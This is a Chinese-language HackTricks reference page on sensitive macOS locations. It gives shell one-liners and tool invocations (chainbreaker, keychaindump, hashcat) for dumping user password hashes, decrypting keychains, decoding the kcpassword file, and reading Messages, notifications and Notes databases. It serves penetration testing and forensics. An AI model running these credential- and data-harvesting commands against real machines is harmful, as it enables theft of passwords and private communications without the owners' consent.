# macOS 敏感位置

<details>

<summary><strong>从零到英雄学习 AWS 黑客技术，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF 版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

## 密码

### 隐藏密码

隐藏密码存储在位于 **`/var/db/dslocal/nodes/Default/users/`** 的用户配置的 plists 中。\
以下单行命令可用于转储**有关用户的所有信息**（包括哈希信息）：

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
```bash
dscl . list /Users | grep -v '^_' | while read user; do echo -n "$user:"; dscl . -read /Users/$user AuthenticationAuthority | grep -o ';ShadowHash;HASH' | cut -d';' -f3 | xxd -r -p | base64; echo; done
```

[**像这个脚本**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) 或者 [**这个脚本**](https://github.com/octomagon/davegrohl.git) 可以用来将哈希转换为 **hashcat** **格式**。

另一个一行命令，它将转储所有非服务账户的凭证为 hashcat 格式 `-m 7100` (macOS PBKDF2-SHA512)：

{% endcode %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### 钥匙串转储

请注意，使用 security 二进制文件来**转储解密的密码**时，会有几个提示要求用户允许此操作。
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
根据这条评论 [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)，看起来这些工具在 Big Sur 中已经不再工作了。
{% endhint %}

攻击者仍然需要获得系统访问权限以及升级到 **root** 权限，以便运行 **keychaindump**。这种方法有其自身的条件。如前所述，**登录后您的钥匙串默认解锁**，并在您使用系统时保持解锁状态。这是为了方便用户，这样用户就不需要每次应用程序希望访问钥匙串时都输入密码。如果用户更改了此设置，并选择在每次使用后锁定钥匙串，则 keychaindump 将不再工作；它依赖于解锁的钥匙串才能运行。

了解 Keychaindump 如何从内存中提取密码非常重要。在此交易中最重要的进程是“**securityd**”**进程**。苹果将此进程称为**授权和加密操作的安全上下文守护进程**。苹果开发者库对此并没有太多描述；然而，它们确实告诉我们 securityd 处理对钥匙串的访问。在他的研究中，Juuso 将**解密钥匙串所需的密钥称为“主密钥”**。需要采取一些步骤来获取这个密钥，因为它是从用户的 OS X 登录密码派生的。如果您想读取钥匙串文件，您必须拥有这个主密钥。以下步骤可以用来获取它。**对 securityd 的堆进行扫描（keychaindump 使用 vmmap 命令完成此操作）**。可能的主密钥存储在标记为 MALLOC_TINY 的区域中。您可以使用以下命令自己查看这些堆的位置：
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
**Keychaindump** 将搜索返回的堆以寻找0x0000000000000018的出现。如果接下来的8字节值指向当前堆，我们就找到了一个潜在的主密钥。从这里开始，还需要进行一些反混淆处理，这可以在源代码中看到，但作为分析师最重要的是要注意，解密这些信息所需的数据存储在securityd的进程内存中。以下是keychain dump输出的一个示例。
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) 可以以取证安全的方式从 OSX 钥匙串中提取以下类型的信息：

* 哈希过的钥匙串密码，适合用 [hashcat](https://hashcat.net/hashcat/) 或 [John the Ripper](https://www.openwall.com/john/) 破解
* 互联网密码
* 通用密码
* 私钥
* 公钥
* X509 证书
* 安全笔记
* Appleshare 密码

如果给定钥匙串解锁密码、使用 [volafox](https://github.com/n0fate/volafox) 或 [volatility](https://github.com/volatilityfoundation/volatility) 获得的主密钥，或者如 SystemKey 的解锁文件，Chainbreaker 也将提供明文密码。

如果没有这些解锁钥匙串的方法，Chainbreaker 将显示所有其他可用信息。

### **导出钥匙串密钥**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
### **使用SystemKey转储钥匙串密钥（包含密码）**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **转储钥匙串密钥（含密码）破解哈希**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **通过内存转储提取钥匙串密钥（含密码）**

[按照这些步骤](..#dumping-memory-with-osxpmem)来执行**内存转储**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **使用用户密码转储密钥链密钥（包括密码）**

如果您知道用户的密码，您可以使用它来**转储并解密属于用户的密钥链**。
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

**kcpassword** 文件是一个存储**用户登录密码**的文件，但仅当系统所有者**启用了自动登录**时才会有。因此，用户将会自动登录，无需输入密码（这不是很安全）。

密码存储在文件 **`/etc/kcpassword`** 中，使用密钥 **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** 进行异或。如果用户密码长度超过密钥长度，密钥将被重复使用。\
这使得密码相当容易恢复，例如使用像[**这个脚本**](https://gist.github.com/opshope/32f65875d45215c3677d)。

## 数据库中的有趣信息

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### 通知

您可以在 `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/` 找到通知数据。

大部分有趣的信息将会在**blob**中。因此，您需要**提取**该内容并将其**转换**为**人类可读**的格式，或者使用**`strings`**。要访问它，您可以执行：

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
### 笔记

用户的**笔记**可以在 `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` 中找到

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
<details>

<summary><strong>从零到英雄学习AWS黑客技术，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
